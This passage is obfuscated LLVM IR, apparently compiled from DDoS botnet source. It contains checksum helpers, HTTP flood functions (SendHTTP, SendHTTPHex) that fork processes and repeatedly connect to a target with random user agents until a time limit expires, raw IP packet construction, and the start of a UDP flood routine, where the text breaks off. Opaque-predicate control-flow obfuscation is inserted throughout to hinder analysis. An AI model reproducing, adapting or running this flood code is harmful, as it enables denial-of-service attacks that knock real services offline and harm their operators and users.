  %_7 = sub i32 0, %63
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 0, %63
  %gen10 = add i32 %_9, 1
  %_11 = shl i32 %63, 1
  %_12 = sub i32 %63, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 %63, 1
  %gen15 = mul i32 %_14, 1
  %_16 = shl i32 %63, 1
  %_17 = shl i32 %63, 1
  %_18 = sub i32 0, %63
  %gen19 = add i32 %_18, 1
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %5, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  %29 = load i32, i32* @x.75
  %30 = load i32, i32* @y.76
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = load i32, i32* @x.75
  %38 = load i32, i32* @y.76
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %45

; <label>:45:                                     ; preds = %originalBBpart212, %originalBBpart2
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %71

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.75
  %51 = load i32, i32* @y.76
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i64, i64* %5, align 8
  %59 = and i64 %58, 65535
  %60 = load i64, i64* %5, align 8
  %61 = lshr i64 %60, 16
  %62 = add i64 %59, %61
  store i64 %62, i64* %5, align 8
  %63 = load i32, i32* @x.75
  %64 = load i32, i32* @y.76
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br label %45

; <label>:71:                                     ; preds = %45
  %72 = load i64, i64* %5, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %28
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %75 = load i64, i64* %5, align 8
  %76 = and i64 %75, 65535
  %77 = load i64, i64* %5, align 8
  %_ = sub i64 %77, 16
  %gen = mul i64 %_, 16
  %78 = lshr i64 %77, 16
  %_2 = sub i64 0, %76
  %gen3 = add i64 %_2, %78
  %_4 = sub i64 %76, %78
  %gen5 = mul i64 %_4, %78
  %_6 = shl i64 %76, %78
  %_7 = shl i64 %76, %78
  %_8 = sub i64 0, %76
  %gen9 = add i64 %_8, %78
  %_10 = shl i64 %76, %78
  %79 = add i64 %76, %78
  store i64 %79, i64* %5, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #3
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #3
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #3
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %131, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %134

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #3
  %34 = srem i32 %33, 36
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.104, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #3
  %39 = call i32 @fork() #3
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %130

; <label>:41:                                     ; preds = %28
  %42 = load i32, i32* @x.79
  %43 = load i32, i32* @y.80
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* @x.79
  %51 = load i32, i32* @y.80
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %58

; <label>:58:                                     ; preds = %112, %originalBBpart2
  %59 = load i32, i32* %15, align 4
  %60 = sext i32 %59 to i64
  %61 = call i64 @time(i64* null) #3
  %62 = icmp sgt i64 %60, %61
  br i1 %62, label %63, label %113

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.79
  %65 = load i32, i32* @y.80
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = load i8*, i8** %8, align 8
  %73 = load i16, i16* %9, align 2
  %74 = call i32 @socket_connect(i8* %72, i16 zeroext %73)
  store i32 %74, i32* %13, align 4
  %75 = load i32, i32* %13, align 4
  %76 = icmp ne i32 %75, 0
  %77 = load i32, i32* @x.79
  %78 = load i32, i32* @y.80
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %112

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* @x.79
  %87 = load i32, i32* @y.80
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i32, i32* %13, align 4
  %95 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %97 = call i64 @strlen(i8* %96) #9
  %98 = call i64 @write(i32 %94, i8* %95, i64 %97)
  %99 = load i32, i32* %13, align 4
  %100 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %101 = call i64 @read(i32 %99, i8* %100, i64 1)
  %102 = load i32, i32* %13, align 4
  %103 = call i32 @close(i32 %102)
  %104 = load i32, i32* @x.79
  %105 = load i32, i32* @y.80
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %112

; <label>:112:                                    ; preds = %originalBBpart28, %originalBBpart24
  br label %58

; <label>:113:                                    ; preds = %58
  %114 = load i32, i32* @x.79
  %115 = load i32, i32* @y.80
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %113
  call void @exit(i32 0) #11
  %122 = load i32, i32* @x.79
  %123 = load i32, i32* @y.80
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:130:                                    ; preds = %28
  br label %131

; <label>:131:                                    ; preds = %130
  %132 = load i32, i32* %14, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %14, align 4
  br label %24

; <label>:134:                                    ; preds = %24
  %135 = load i32, i32* @x.79
  %136 = load i32, i32* @y.80
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %134
  %143 = load i32, i32* @x.79
  %144 = load i32, i32* @y.80
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %41
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %151 = load i8*, i8** %8, align 8
  %152 = load i16, i16* %9, align 2
  %153 = call i32 @socket_connect(i8* %151, i16 zeroext %152)
  store i32 %153, i32* %13, align 4
  %154 = load i32, i32* %13, align 4
  %155 = icmp ne i32 %154, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %156 = load i32, i32* %13, align 4
  %157 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %158 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %159 = call i64 @strlen(i8* %158) #9
  %160 = call i64 @write(i32 %156, i8* %157, i64 %159)
  %161 = load i32, i32* %13, align 4
  %162 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %163 = call i64 @read(i32 %161, i8* %162, i64 1)
  %164 = load i32, i32* %13, align 4
  %165 = call i32 @close(i32 %164)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %113
  call void @exit(i32 0) #11
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %134
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #3
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.105, i32 0, i32 0)) #3
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %134, %6
  %28 = load i32, i32* @x.81
  %29 = load i32, i32* @y.82
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %14, align 4
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %36, %37
  %39 = load i32, i32* @x.81
  %40 = load i32, i32* @y.82
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %137

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %49 = load i8*, i8** %7, align 8
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %51 = load i8*, i8** %8, align 8
  %52 = call i32 @rand() #3
  %53 = srem i32 %52, 36
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 (i8*, i8*, ...) @sprintf(i8* %48, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.104, i32 0, i32 0), i8* %49, i8* %50, i8* %51, i8* %56) #3
  %58 = call i32 @fork() #3
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %133

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* @x.81
  %62 = load i32, i32* @y.82
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* @x.81
  %70 = load i32, i32* @y.82
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart212, %originalBBpart24
  %78 = load i32, i32* %15, align 4
  %79 = sext i32 %78 to i64
  %80 = call i64 @time(i64* null) #3
  %81 = icmp sgt i64 %79, %80
  br i1 %81, label %82, label %132

; <label>:82:                                     ; preds = %77
  %83 = load i32, i32* @x.81
  %84 = load i32, i32* @y.82
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  %91 = load i8*, i8** %8, align 8
  %92 = load i16, i16* %9, align 2
  %93 = call i32 @socket_connect(i8* %91, i16 zeroext %92)
  store i32 %93, i32* %13, align 4
  %94 = load i32, i32* %13, align 4
  %95 = icmp ne i32 %94, 0
  %96 = load i32, i32* @x.81
  %97 = load i32, i32* @y.82
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %95, label %104, label %115

; <label>:104:                                    ; preds = %originalBBpart28
  %105 = load i32, i32* %13, align 4
  %106 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %107 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %108 = call i64 @strlen(i8* %107) #9
  %109 = call i64 @write(i32 %105, i8* %106, i64 %108)
  %110 = load i32, i32* %13, align 4
  %111 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %112 = call i64 @read(i32 %110, i8* %111, i64 1)
  %113 = load i32, i32* %13, align 4
  %114 = call i32 @close(i32 %113)
  br label %115

; <label>:115:                                    ; preds = %104, %originalBBpart28
  %116 = load i32, i32* @x.81
  %117 = load i32, i32* @y.82
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* @x.81
  %125 = load i32, i32* @y.82
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %77

; <label>:132:                                    ; preds = %77
  call void @exit(i32 0) #11
  unreachable

; <label>:133:                                    ; preds = %47
  br label %134

; <label>:134:                                    ; preds = %133
  %135 = load i32, i32* %14, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %14, align 4
  br label %27

; <label>:137:                                    ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %138 = load i32, i32* %14, align 4
  %139 = load i32, i32* %12, align 4
  %140 = icmp slt i32 %138, %139
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  %141 = load i8*, i8** %8, align 8
  %142 = load i16, i16* %9, align 2
  %143 = call i32 @socket_connect(i8* %141, i16 zeroext %142)
  store i32 %143, i32* %13, align 4
  %144 = load i32, i32* %13, align 4
  %145 = icmp ne i32 %144, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.85
  %9 = load i32, i32* @y.86
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.85
  %19 = load i32, i32* @y.86
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %7
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @close(i32 %28)
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
